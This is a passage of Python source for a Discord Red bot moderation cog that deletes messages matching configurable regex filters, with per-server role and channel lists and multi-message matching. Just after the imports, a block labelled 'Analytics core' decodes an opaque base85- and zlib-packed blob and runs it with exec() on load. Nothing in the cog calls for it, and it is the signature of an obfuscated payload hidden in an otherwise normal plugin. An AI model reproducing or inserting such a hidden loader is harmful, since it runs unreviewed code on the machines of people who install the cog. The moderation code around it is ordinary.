from collections import defaultdict, OrderedDict
from datetime import datetime, timedelta
import discord
from discord import Message, Object as DiscordObject
from discord.mixins import Hashable as DiscordHashable
from discord.ext import commands
from discord.ext.commands.errors import BadArgument
from discord.ext.commands.view import StringView
from enum import Enum
from functools import partial
import inspect
import itertools
import logging
import os
import re
import time
from typing import Callable, Hashable, Iterable, Iterator, List, Optional, Sequence, Tuple, TypeVar, Union
import unicodedata
import urllib.parse

from .utils.dataIO import dataIO
from .utils import checks
from .utils.chat_formatting import box, warning, error, info

# FIXME: once red#1956 is fixed, all OSes can use ProcessPool
if os.name == 'nt':
    from concurrent.futures import ThreadPoolExecutor as ExecutorClass
else:
    from concurrent.futures import ProcessPoolExecutor as ExecutorClass

try:
    from unidecode import unidecode
except ImportError:
    unidecode = None

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core

__version__ = '2.5.0'

log = logging.getLogger('red.recensor')

DATA_PATH = "data/recensor/"
JSON_PATH = DATA_PATH + "regexen.json"
DEFAULT_FLAGS = 'IS'
MSG_HISTORY_MAX_NUM = 32
MSG_HISTORY_MAX_TIME = 60 * 10  # 10 minutes
CONCAT_JOIN = '\n'

DiscordUniObj = Union[DiscordObject, DiscordHashable]
T = TypeVar('T')
HT = TypeVar('HT', bound=Hashable)
SRE_Match = type(re.match('', ''))

FLAGS_DESC = {
    'A': 'ASCII',
    'I': 'ignorecase',
    'L': 'locale',
    'M': 'multiline',
    'S': 'dotall',
    'X': 'verbose'
}

DATACLASSES_BY_NAME = {
    'server': discord.Server,
    'role': discord.Role,
    'channel': discord.Channel,
    'member': discord.Member,
    'user': discord.User
}

NAMES_BY_DATACLASS = {DATACLASSES_BY_NAME[k]: k for k in DATACLASSES_BY_NAME}

ITEM_LOOKUP_GETTERS = {
    discord.Role: lambda c: (c.message.server and (lambda i: discord.utils.get(c.message.server.roles, id=i))),
    discord.Emoji: lambda c: (c.message.server and (lambda i: discord.utils.get(c.message.server.emojis, id=i))),
    discord.Channel: lambda c: (c.message.server and c.message.server.get_channel),
    discord.Member: lambda c: (c.message.server and c.message.server.get_member),
    discord.User: lambda c: (c.message.server and c.message.server.get_member),
    discord.Server: lambda c: c.bot.get_server
}

ITEM_LIST_GETTERS = {
    discord.Role: lambda c: (c.message.server and c.message.server.roles),
    discord.Emoji: lambda c: (c.message.server and c.message.server.emojis),
    discord.Channel: lambda c: (c.message.server and c.message.server.channels),
    discord.Member: lambda c: (c.message.server and c.message.server.members),
    discord.User: lambda c: (c.message.server and c.message.server.members),
    discord.Server: lambda c: c.bot.servers
}

MENTIONS_BY_DATACLASS = {
    discord.Role: '<@&%s>',
    discord.Channel: '<#%s>',
    discord.Member: '<@!%s>',
    discord.User: '<@!%s>'
}

# Symbols that aren't converted by unidecode
EMOJI_LETTERS = dict(zip(
    '🅰🅱🅾🅿🇦🇧🇨🇩🇪🇫🇬🇭🇮🇯🇰🇱🇲🇳🇴🇵🇶🇷🇸🇹🇺🇻🇼🇽🇾🇿⭕❌',
    'ABOPABCDEFGHIJKLMNOPQRSTUVWXYZOX'
))


# Isolated to allow running potentially slow patterns in an executor
def check_match(predicate: Callable[[str], Optional[SRE_Match]], string: str) -> dict:
    """
    Match task worker.

    Takes a predicate returning a regex match and the string to pass it.
    Returns a dict of time elapsed and match information (if any) or any match exception.
    """
    t0 = time.perf_counter()
    ret = {}

    try:
        match = predicate(string)
    except Exception as e:
        match = None
        ret['exception'] = e

    elapsed = time.perf_counter() - t0

    ret['time'] = elapsed

    if match:
        ret['match'] = match.group(0)
        ret['span'] = match.span(0)
        groups = match.groups()

        if groups:
            ret.update({
                'group_spans' : tuple(match.span(i + 1) for i in range(len(groups))),
                'groupdict'   : match.groupdict(),
                'groups'      : groups
            })

    return ret


def check_match_iter(predicate: Callable[[str], Iterator[SRE_Match]], string: str) -> List[dict]:
    """
    Finditer match task worker.
    """
    ret_list = []
    match_iter = predicate(string)

    while True:
        t0 = time.perf_counter()
        ret = {}

        try:
            match = next(match_iter)
        except StopIteration:
            break
        except Exception as e:
            match = None
            ret['exception'] = e

        elapsed = time.perf_counter() - t0

        ret['time'] = elapsed

        if match:
            ret['match'] = match.group(0)
            ret['span'] = match.span(0)
            groups = match.groups()

            if groups:
                ret.update({
                    'group_spans' : tuple(match.span(i + 1) for i in range(len(groups))),
                    'groupdict'   : match.groupdict(),
                    'groups'      : groups
                })

        ret_list.append(ret)

        if 'exception' in ret:
            break

    return ret_list


def check_matches(inputs: Iterable[Tuple[Callable[[str], dict], str, bool]], no_stop: bool = False) -> List[dict]:
    """
    Call multiple check_match.

    Takes an iterable of (callable, str, bool) pairs. Bool indicates whether to stop on a match.
    If no_stop is True, run all matches regardless of bool in tuple.
    Returns a list of data returned by each call of check_match.
    """
    ret_list = []

    for predicate, string, stop_on_match in inputs:
        ret = predicate(string)
        ret_list.append(ret)

        if (stop_on_match and not no_stop) and (('match' in ret) if type(ret) is dict else len(ret)):
            return ret_list

    return ret_list


def concat_with_keys(strings: Sequence[str], join: str = CONCAT_JOIN) -> Tuple[str, List[int]]:
    """
    Returns the concatenated string (joined on `join`) and a list of the end position of each string in the output
    """
    indices = []
    i = 0
    join_len = len(join)

    if not isinstance(strings, Sequence):
        strings = tuple(strings)

    for string in strings:
        i += len(string) + join_len
        indices.append(i)

    indices[-1] -= join_len

    return join.join(strings), indices


def sequence_from_indices(sequence: Sequence[T], indices: Sequence[int], keys: Tuple[int, int],
                          inner_only: bool = False) -> List[T]:
    """
    Returns a list of the objects that the match denoted by `keys` overlapped, based on `indices`.
    If `inner_only` is True, only return the items covered completely by the span.
    """
    ret = []
    start, end = keys
    last_index = 0

    for obj, index in zip(sequence, indices):
        if index <= start or (inner_only and last_index < start):
            pass
        elif index >= end:
            if index == end or not inner_only:
                ret.append(obj)
            break
        else:
            ret.append(obj)

        last_index = index

    return ret


def asciify_string(string: str) -> str:
    # Strip marks/combining characters
    string = (c for c in string if not unicodedata.category(c).startswith('M'))

    # Run through substitution table
    string = ''.join(EMOJI_LETTERS.get(c, c) for c in string)

    # Run through unidecode, if available
    if unidecode:
        return unidecode.unidecode(string)

    return string


def preprocess_msg(_filter, message):
    if _filter.attachment_header and message.attachments:
        return '{attachment:%s}%s' % (message.attachments[0]['filename'], message.content)
    elif message.content.startswith('{attachment:'):
        return '{' + message.content
    else:
        return message.content


# https://stackoverflow.com/a/11564323
def topological_sort(source: Iterable[Tuple[HT, Sequence[HT]]]) -> Iterator[HT]:
    """
    Perform topo sort on elements.

    :arg source: list of ``(name, [list of dependencies])`` pairs
    :returns: list of names, with dependencies listed first
    """
    # copy dependencies so we can modify set in-place
    pending = [(name, set(deps)) for name, deps in source]
    emitted = []

    while pending:
        next_pending = []
        next_emitted = []

        for entry in pending:
            name, deps = entry
            deps.difference_update(emitted)  # remove deps we emitted last pass

            if deps:  # still has deps? recheck during next pass
                next_pending.append(entry)
            else:  # no more deps? time to emit
                yield name
                emitted.append(name)  # <-- not required, but helps preserve original ordering
                next_emitted.append(name)  # remember what we emitted for difference_update() in next pass

        if not next_emitted:  # all entries have unmet dependencies, one of two things is wrong...
            raise ValueError("cyclic or missing dependency detected: %r" % (next_pending,))

        pending = next_pending
        emitted = next_emitted


class POSITION(Enum):
    START = 'start'
    FULL = 'full'
    ANYWHERE = 'anywhere'


#  -> Optional[Type[DiscordUniObj]], but it breaks 3.5
def type_from_name(list_name: str):
    for k in DATACLASSES_BY_NAME:
        k = k.lower()
        if list_name.startswith(k):
            return DATACLASSES_BY_NAME[k]

    return None


def flags_to_int(flag_chars):
    flags = 0

    for c in flag_chars:
        flags |= getattr(re, c.upper(), 0)

    return flags


class BoundedOrderedDict(OrderedDict):
    __slots__ = ['_maxlen']

    def __init__(self, iterable: Sequence = (), maxlen=None):
        self._maxlen = maxlen
        super().__init__(iterable)

    @property
    def maxlen(self):
        return self._maxlen

    def __setitem__(self, key, value):
        if not self.__contains__(key) and len(self) == self._maxlen:
            self.popitem(last=False)

        super().__setitem__(key, value)


class FilterBase:
    pass


class ItemTypeReference(DiscordObject, DiscordHashable):
    pass


class FilterList:
    __slots__ = ['parent', 'base_list', 'item_type', 'enabled', 'mode', 'overlay', 'items', 'whoami']

    # item_type is Type[DiscordUniObj], but that apparently breaks some versions of 3.5
    def __init__(self, parent, whoami: str, item_type, *, base_list=None, **data):
        self.parent = parent
        self.whoami = whoami
        self.base_list = base_list
        self.item_type = item_type

        self.enabled = data.get('enabled', False)
        self.mode = data.get('mode', True)
        self.overlay = data.get('overlay', True)
        self.items = set(data.get('items', []))

    def convert_item(self, ctx, item):
        """
        Attempts to use discord's converters on the item type. Requires ctx.
        """
        return ctx.command.do_conversion(ctx, self.item_type, item)

    def check(self, obj: DiscordUniObj) -> bool:
        """
        Return True if obj is in the list, based on its ID attribute
        """
        return isinstance(obj, self.item_type) and self.check_id(obj.id)

    def check_id(self, obj_id: str, *, recurse=True) -> Optional[bool]:
        """
        Checks whether an ID is a member of the list
        """
        if recurse and self.overlay and self.base_list and self.base_list.check_id(obj_id) is False:
            return False
        elif not self.enabled:
            return None

        if obj_id in self.items:
            return self.mode

        return not self.mode

    def check_id_iter(self, id_iter: Iterable[str]) -> Optional[bool]:
        """
        Return True if ANY object whose IDs are in id_list are in the list
        """
        base_enabled = self.overlay and self.base_list and self.base_list.enabled

        if not self.enabled:
            if base_enabled:
                return self.base_list.check_id_iter(id_iter)
            else:
                return None

        if base_enabled:
            for _id in id_iter:
                if self.base_list.check_id(_id) is False:
                    return False
                elif self.check_id(_id, recurse=False):
                    return True

        elif any(_id in self.items for _id in id_iter):
            return self.mode

        return not self.mode

    def check_iter(self, obj_list: Iterable[DiscordUniObj]) -> Optional[bool]:
        return self.check_id_iter((x.id for x in obj_list))

    def filter(self, items: Iterable) -> List:
        """
        Returns a subset of the input containing objects that are in the list
        """
        return list(filter(self.check, items))

    def to_json(self) -> dict:
        data = {
            'mode': self.mode,
            'items': list(self.items),
            'enabled': self.enabled
        }

        if self.overlay is not None:
            data['overlay'] = self.overlay

        return data

    def __contains__(self, obj: DiscordUniObj) -> bool:
        return self.check(obj)

    def copy(self, new_parent):
        return type(self)(
            new_parent or self.parent,
            self.whoami,
            self.item_type,
            base_list=self.base_list,
            enabled=self.enabled,
            mode=self.mode,
            overlay=self.overlay,
            items=self.items.copy()
        )


class ServerConfig(FilterBase):
    __slots__ = ['cog', 'asciify', 'priv_exempt', 'roles_list', 'channels_list', 'filters', 'order']

    def __init__(self, cog, **data):
        self.cog = cog
        self.name = 'SERVER'

        self.asciify = data.get('asciify', False)
        self.priv_exempt = data.get('priv_exempt', True)
        self.filters = {}
        self.order = []

        lists_deps = {}

        # Create server-wide lists
        for list_name in ['roles_list', 'channels_list']:
            item_type = type_from_name(list_name)
            _list = FilterList(self, list_name, item_type, overlay=None, **data.get(list_name, {}))
            setattr(self, list_name, _list)
            lists_deps[list_name] = {}

        # Instantiate filters without linked sublists
        for name, filter_data in data.get('filters', {}).items():
            self.filters[name] = Filter(self, name=name, defer_link=True, **filter_data)

            # list_deps is empty, set it here
            for list_name, list_deps in lists_deps.items():
                link_name = filter_data.get(list_name + '_link')

                if link_name in [None, 'SERVER']:
                    list_deps[name] = []
                else:
                    list_deps[name] = [link_name]

        for list_name, list_deps in lists_deps.items():
            for filter_name in topological_sort(list_deps.items()):
                if list_deps[filter_name]:  # if dep list is nonempty
                    self.filters[filter_name].set_list(list_name, link_dest=list_deps[filter_name][0])

        self.update_order()

    def update_order(self):
        filters = (f for f in self.filters.values() if f.enabled)
        self.order[:] = sorted(filters, key=lambda f: f.filter_priority, reverse=True)

    def make_link(self, link_owner, target_owner, list_name):
        dep_graph = {}

        # build the current state
        for _filter in self.filters.values():
            link_dest = _filter.links.get(list_name)
            dep_graph[_filter.name] = [] if link_dest in [self, None] else [link_dest.name]

        # make the proposed change
        dep_graph[link_owner.name] = [target_owner.name]

        # test for cycles/broken links
        sorted_names = list(topological_sort(dep_graph.items()))

        # apply the changes
        for name in sorted_names:
            if dep_graph[name]:
                self.filters[name].set_list(list_name, link_dest=dep_graph[name][0])
            else:
                self.filters[name].links.pop(list_name, None)

        assert getattr(link_owner, list_name) is getattr(target_owner, list_name)
        return getattr(target_owner, list_name)

    def break_link(self, link_owner, list_name, *, copy=False, **newlist_data):
        current_list = getattr(link_owner, list_name)
        if current_list.parent is link_owner:
            raise TypeError("Not linked.")
        elif copy and newlist_data:
            raise TypeError("If copy is set, no extra data should be passed.")

        dep_graph = {}

        # build the current state
        for _filter in self.filters.values():
            link_dest = _filter.links.get(list_name)
            dep_graph[_filter.name] = [] if link_dest in [self, None] else [link_dest.name]

        # make the proposed change
        dep_graph[link_owner.name] = []

        # test for cycles/broken links
        sorted_names = list(topological_sort(dep_graph.items()))

        # apply the changes
        for name in sorted_names:
            if dep_graph[name]:
                self.filters[name].set_list(list_name, link_dest=dep_graph[name][0])
            else:
                self.filters[name].links.pop(list_name, None)

            if name == link_owner.name:
                if copy:
                    newlist_obj = getattr(link_owner, list_name).copy(link_owner)
                    link_owner.set_list(list_name, new_list_obj=newlist_obj)
                else:
                    self.filters[name].set_list(list_name, new_list_data=newlist_data)

        return getattr(link_owner, list_name)

    def get_filter(self, _filter: Union[str, 'Filter'], check=False):
        if isinstance(_filter, Filter):
            if _filter.parent is not self:
                if not check:
                    return None
                raise TypeError("the provided filter does not belong to this config")
            elif _filter not in self.filters.values():
                if not check:
                    return None
                raise ValueError("the provided filter is not in this config")
            else:
                return _filter
        elif type(_filter) is str:
            if _filter not in self.filters:
                if not check:
                    return None
                raise ValueError("there is no filter named '%s'" % _filter)
            else:
                return self.filters[_filter]
        else:
            raise TypeError('only Filter objects or names (str) may be passed')

    def add_filter(self, name: str, **data):
        if self.get_filter(name):
            raise ValueError("filter %s already exists" % name)

        self.filters[name] = f = Filter(self, name=name, **data)

        if f.enabled:
            self.update_order()

        return f

    def rename_filter(self, _filter: Union[str, 'Filter'], new_name: str):
        _filter = self.get_filter(_filter, check=True)

        if type(new_name) is not str:
            raise TypeError('only strings may be passed as new name')
        elif not new_name:
            raise ValueError('new name must be nonempty')

        if self.get_filter(new_name):
            raise ValueError("filter %s already exists" % new_name)

        self.filters[new_name] = self.filters.pop(_filter.name)
        _filter.name = new_name
        return _filter

    def copy_filter(self, _filter: Union[str, 'Filter'], new_name: str, link=False, **kwargs):
        _filter = self.get_filter(_filter, check=True)

        if type(new_name) is not str:
            raise TypeError('only strings may be passed as new name')
        elif not new_name:
            raise ValueError('new name must be nonempty')

        if self.get_filter(new_name):
            raise ValueError("filter %s already exists" % new_name)

        copied = self.filters[new_name] = _filter.copy(new_name, link=link, **kwargs)
        return copied

    def delete_filter(self, _filter: Union[str, 'Filter']):
        _filter = self.get_filter(_filter, check=True)

        channels_linked = []
        roles_linked = []
        linked_err = []

        for filter_name, f in self.filters.items():
            if f is _filter:
                continue
            if f.links.get('channels_list') is _filter:
                channels_linked.append(filter_name)
            if f.links.get('roles_list') is _filter:
                roles_linked.append(filter_name)

        if channels_linked:
            linked_err.append('channels: ' + ', '.join(channels_linked))
        if roles_linked:
            linked_err.append('roles: ' + ', '.join(roles_linked))
        if linked_err:
            raise TypeError('links exist from other filters: ' + '; '.join(linked_err))

        self.filters.pop(_filter.name)

        if _filter.enabled:
            self.update_order()

        return True

    async def check_message(self, message: Message, list_cache: dict = None) -> bool:
        """
        Return true if message should be deleted
        """
        has_white = False
        content_cache = {}
        checks = []
        checked = []

        if list_cache is None:
            list_cache = {}

        for f in self.order:
            # Don't run if the filter is multi-message
            if f.multi_msg or not (f.check_meta(message, list_cache) and f.predicate):
                continue

            asciify = f.asciify or (f.asciify is None and self.asciify)
            ck = (asciify, f.attachment_header)

            if ck in content_cache:
                content = content_cache[ck]
            else:
                content = preprocess_msg(f, message)

                if asciify:
                    content = asciify_string(content)

                content_cache[ck] = content

            stop_on_match = f.override or not f.mode  # short-circuit for override or blacklist mode
            checked.append(f)
            checks.append((f.predicate, content, stop_on_match))

        if not checks:
            return False

        matches = await self.cog.bot.loop.run_in_executor(self.cog.executor, check_matches, checks)
        has_white = False
        match_white = False

        for f, match_dict in zip(checked, matches):
            matched = match_dict.get('match', False)

            if f.override and matched:  # override black or white
                return not f.mode
            elif has_white and not f.mode and not match_white:
                return True  # Message has whitelist but nothing matched, return immediately
            elif f.mode and not f.override:  # white for normal only, ORed between all matches
                has_white = True
                match_white |= bool(matched)
            elif matched:  # black regular
                return True

        if has_white:
            return not match_white
        else:
            return False

    async def debug_message(self, message: Message) -> Tuple[List[Tuple[str, str, Optional[str]]],
                                                             Optional[Tuple[str, bool]]]:
        """
        Return a list of each filter's results and the ultimate action that would be taken, if any
        """
        has_white = False
        match_white = False
        content_cache = {}
        list_cache = {}
        action = None
        results = []

        for f in self.order:
            meta_result = f.check_meta(message, list_cache, debug=True)

            if not meta_result[0]:
                results.append((f.name, 'meta skip', meta_result[1]))
                continue
            elif not f.predicate:
                results.append((f.name, 'no predicate', None))
                continue

            asciify = f.asciify or (f.asciify is None and self.asciify)
            ck = (asciify, f.attachment_header)

            if ck in content_cache:
                content = content_cache[ck]
            else:
                content = preprocess_msg(f, message)

                if asciify:
                    content = asciify_string(content)

                content_cache[ck] = content

            match = await self.cog.bot.loop.run_in_executor(self.cog.executor, f.predicate, content)

            if f.override and match:  # override black or white
                if action is None:
                    action = (f.name, not f.mode)

                result = 'override match', match and content[match[0]:match[1]]
            elif has_white and not f.mode and not match_white:
                if action is None:
                    action = (f.name, True)

                result = 'white->black transition but no white match', match and content[match[0]:match[1]]
            elif f.mode and not f.override:
                has_white = True
                match_white |= bool(match)
                result = 'white test (%s)' % ('hit' if bool(match) else 'miss'), match and content[match[0]:match[1]]
            elif match:
                if action is None:
                    action = (f.name, True)

                result = 'black match', match and content[match[0]:match[1]]
            else:
                result = 'default case', None

            results.append((f.name, *result))

        if has_white:
            action = ('default w/ whitelist', not match_white)

        return results, action

    async def check_sequence(self, messages: Sequence[Message], list_cache: Optional[dict] = None) -> List[Message]:
        """
        Return a list of messages from the sequence that should be deleted
        """
        has_white = False
        joined_cache = {}
        content_cache = {}
        checks = []
        checked = []

        if not messages:
            return []
        elif list_cache is None:
            list_cache = {}

        for f in self.order:
            if not (f.multi_msg and f.check_meta(messages[-1], list_cache) and f.predicate):
                continue

            asciify = f.asciify or (f.asciify is None and self.asciify)
            jk = (asciify, f.multi_msg_join, f.attachment_header)

            if jk in joined_cache:
                content, indices = joined_cache[jk]
            else:
                strings = []

                for message in messages:
                    ck = (asciify, f.attachment_header, message.id)

                    if ck in content_cache:
                        content = content_cache[ck]
                    else:
                        content = preprocess_msg(f, message)

                        if asciify:
                            content = asciify_string(content)

                        content_cache[ck] = content

                    strings.append(content)

                joined_cache[jk] = (content, indices) = concat_with_keys(strings, f.multi_msg_join)

            # Don't stop immediately on white
            stop_on_match = f.override or not f.mode
            predicate = partial(check_match_iter, f.compiled.finditer) if f.mode else f.predicate
            checks.append((predicate, content, stop_on_match))
            checked.append((f, indices))

        matches = await self.cog.bot.loop.run_in_executor(self.cog.executor, check_matches, checks)
        has_white = False
        matched_message_set = set()
        message_set = set(messages)
        to_delete = message_set.copy()
        new_wlc = []

        for (f, indices), match_obj in zip(checked, matches):
            if type(match_obj) is list:
                matches = match_obj
            else:
                matches = [match_obj]

            matched_message_set.clear()
            new_wlc.clear()

            for match in matches:
                if 'match' not in match:
                    continue
                elif f.multi_msg_group > 0 and not f.mode:  # groups disabled for whitelist
                    if len(match.get('group_spans', [])) < f.multi_msg_group:
                        continue

                    match = match['group_spans'][f.multi_msg_group - 1]
                else:
                    match = match['span']

                match_messages = sequence_from_indices(messages, indices, match)
                matched_message_set.update(match_messages)

                if f.mode:
                    new_wlc.append((match_messages[0].id, match_messages[-1].id))

            if matched_message_set and f.mode:
                wlc_key = (messages[-1].channel.id, messages[-1].author.id)
                to_delete -= matched_message_set

                for start_id, end_id in f.mm_white_lastmatch_cache.get(wlc_key, ()):
                    # The only case we care about: the start of a former match is outside the window, but not the end
                    if start_id < messages[0].id < end_id:
                        for message in itertools.takewhile(lambda m: m.id <= end_id, messages):
                            to_delete.discard(message)

                f.mm_white_lastmatch_cache[wlc_key] = new_wlc.copy()

            if f.override and matched_message_set and not f.mode:  # override black
                return matched_message_set
            elif f.override and f.mode and to_delete:  # override white
                return to_delete
            elif has_white and not f.mode and to_delete:
                return to_delete  # Message has whitelist but we're on a blacklist, return immediately
            elif f.mode and not f.override:  # white for normal only
                has_white = True
            elif matched_message_set:  # regular black
                return matched_message_set

        if has_white:
            return to_delete
        else:
            return ()

    def to_json(self):
        return {
            'asciify'      : self.asciify,
            'priv_exempt'  : self.priv_exempt,
            'channels_list': self.channels_list.to_json(),
            'roles_list'   : self.roles_list.to_json(),
            'filters'      : {k: v.to_json() for k, v in self.filters.items()}
        }


class Filter(FilterBase):
    __slots__ = ['parent', 'name', 'pattern', 'flags', 'mode', 'enabled', 'override', 'asciify', 'position',
                 'channels_list', 'roles_list', 'priv_exempt', 'multi_msg', 'links', 'attachment_header',
                 'multi_msg_group', 'multi_msg_join', '_predicate', '_compiled', 'mm_white_lastmatch_cache']

    def __init__(self, parent: ServerConfig, name: str, *, defer_link=False, **data):
        self.parent = parent
        self.name = name

        self.pattern = data.get('pattern', '')
        self.flags = data.get('flags', DEFAULT_FLAGS)
        self.mode = data.get('mode', False)
        self.enabled = data.get('enabled', False)
        self.override = data.get('override', False)
        self.priv_exempt = data.get('priv_exempt', None)
        self.multi_msg = data.get('multi_msg', False)
        self.multi_msg_join = data.get('multi_msg_join', CONCAT_JOIN)
        self.multi_msg_group = data.get('multi_msg_group', 0)
        self.asciify = data.get('asciify', None)
        self.attachment_header = data.get('attachment_header', False)

        self.position = POSITION(data.get('position', POSITION.ANYWHERE))
        self.rebuild_predicate()
        self.mm_white_lastmatch_cache = {}

        self.links = {}

        for k in ['roles_list', 'channels_list']:
            if isinstance(data.get(k), FilterList):
                self.set_list(k, new_list_obj=data[k])
            else:
                self.set_list(k, link_dest=data.get(k + '_link'), defer=defer_link, new_list_data=data.get(k, {}))

    def set_list(self, list_name, *, link_dest=None, defer=False, new_list_data=None, new_list_obj: FilterList = None):
        list_val = None
        server_list = getattr(self.parent, list_name)

        if not link_dest:
            if new_list_data is None and not new_list_obj:
                raise TypeError("list_data or list_obj required without link_dest")
            elif new_list_obj and new_list_data is not None:
                raise TypeError("only list_data or list_obj can be passed, not both")
            elif new_list_obj:
                list_val = new_list_obj
            else:
                item_type = type_from_name(list_name)
                list_val = FilterList(self, list_name, item_type, base_list=server_list, **new_list_data)

            self.links.pop(list_name, None)
        elif link_dest == 'SERVER':
            list_val = server_list
            self.links[list_name] = self.parent
        elif not defer:
            linked_filter = self.parent.filters[link_dest]
            self.links[list_name] = linked_filter
            list_val = getattr(linked_filter, list_name)

        setattr(self, list_name, list_val)

    def rebuild_predicate(self):
        try:
            self._compiled = compiled = re.compile(self.pattern, flags_to_int(self.flags))
        except re.error:
            self._predicate = False
            self._compiled = None
            return False, None

        if self.position == POSITION.START:
            match_func = compiled.match
        elif self.position == POSITION.FULL:
            match_func = compiled.fullmatch
        elif self.position == POSITION.ANYWHERE:
            match_func = compiled.search
        else:
            raise ValueError("Unknown position value: %s" % self.position)

        self._predicate = predicate = partial(check_match, match_func)
        return predicate, compiled

    @property
    def predicate(self):
        if not self._predicate:
            predicate, compiled = self.rebuild_predicate()
            return predicate

        return self._predicate

    @property
